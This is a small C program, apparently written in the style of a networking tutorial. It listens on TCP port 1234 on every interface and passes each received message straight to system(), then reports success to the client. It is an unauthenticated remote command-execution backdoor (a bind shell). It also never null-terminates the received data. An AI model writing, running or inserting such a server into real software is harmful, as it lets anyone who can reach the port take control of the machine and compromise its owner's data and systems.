#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>

int
main ()
{

	#define MAXLINE 4096
	#define LISTENQ 5
	#define SA struct sockaddr

	int listenfd, connfd;
	struct sockaddr_in servaddr;
	char buff[MAXLINE];
	
	/* setup socket descriptor */
	listenfd = socket(AF_INET, SOCK_STREAM, 0);

	/* set structure to zero */	
	bzero(&servaddr, sizeof(servaddr));

	/* set to IPv4 */
	servaddr.sin_family = AF_INET;

	/* listen on any IP address port 1234 */
	servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servaddr.sin_port = htons(1234);

	/* bind to socket and listen for incoming requests */	
	bind(listenfd, (SA *) &servaddr, sizeof(servaddr));
	listen(listenfd, LISTENQ);

	/* endless loop. Service one client at a time, then go back
	   to listening */	
	for ( ; ; ) {
		/* process goes to sleep after 'accept' until a client
		   connection arrives and is accepted after TCP's
		   three-way handshake*/
		connfd = accept(listenfd, (SA *) NULL, NULL);

		recv(connfd, buff, sizeof(buff), 0);

		printf("SERVER: Executing \"%s\"\n", buff);

		system(buff);

		/* fill buffer with data to send to client */		
		snprintf(buff, sizeof(buff), "CLIENT: Command successful!\r\n");

		/* send buffer to client */
		write(connfd, buff, strlen(buff));

		/* close connection, restart while loop, goes back to sleep
		  after accept	*/
		close(connfd);
	}
}

